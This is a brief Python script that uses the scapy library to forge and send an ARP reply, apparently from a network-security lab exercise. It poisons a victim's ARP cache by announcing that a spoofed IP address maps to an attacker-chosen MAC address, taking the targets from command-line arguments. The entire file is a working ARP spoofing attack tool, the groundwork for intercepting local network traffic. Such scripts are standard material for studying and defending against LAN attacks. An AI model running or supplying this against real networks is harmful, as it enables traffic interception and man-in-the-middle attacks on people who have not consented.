#!/usr/bin/python3
import sys
from scapy.all import *

ip_victim = sys.argv[1]
mac_victim_real = sys.argv[2]
ip_fake = sys.argv[3]
mac_fake = sys.argv[4]

ether = Ether(src=mac_fake, dst=mac_victim_real)
arp = ARP(psrc=ip_fake, hwsrc=mac_fake, pdst=ip_victim, hwdst=mac_victim_real)

arp.op = 2 # reply
frame = ether/arp
sendp(frame)
